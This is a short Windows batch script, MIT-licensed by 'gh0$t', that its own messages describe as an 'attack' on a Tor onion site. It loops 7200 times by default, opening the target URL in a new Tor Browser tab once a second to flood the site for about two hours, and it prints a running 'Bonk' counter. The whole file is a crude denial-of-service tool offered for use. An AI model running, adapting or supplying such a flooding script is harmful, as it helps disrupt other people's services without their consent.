@ECHO OFF

rem MIT License
rem 
rem Copyright (c) 2021 gh0$t
rem 
rem Permission is hereby granted, free of charge, to any person obtaining a copy
rem of this software and associated documentation files (the "Software"), to deal
rem in the Software without restriction, including without limitation the rights
rem to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
rem copies of the Software, and to permit persons to whom the Software is
rem furnished to do so, subject to the following conditions:
rem 
rem The above copyright notice and this permission notice shall be included in all
rem copies or substantial portions of the Software.
rem 
rem THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
rem IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
rem FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
rem AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
rem LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
rem OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
rem SOFTWARE.

set url="http://urlOfOnionSite.onion/"
set TORPath="PathToTORBrowser\Tor Browser\Browser\firefox.exe"
set  /A attackTimes=7200

ECHO Starting TOR.
ECHO Commencing attack on :
ECHO %url%
ECHO within 10 seconds. 
ECHO The attack is carried out once every second. 
ECHO Thus "attackTimes=7200" will result in a 2 Hour attack, and so on.
ECHO attackTimes set = %attackTimes%

set  /A HRS=%attackTimes%/3600

ECHO Thus, time taken for current attacks to complete = %HRS% HRS

timeout /t 10 /nobreak

FOR /L %%A IN (1,1,%attackTimes%) DO (
  ECHO Bonk %%A
  %TORPath% --allow-remote  --new-tab %url%
  timeout /t 1 /nobreak>NUL
)

cmd /k
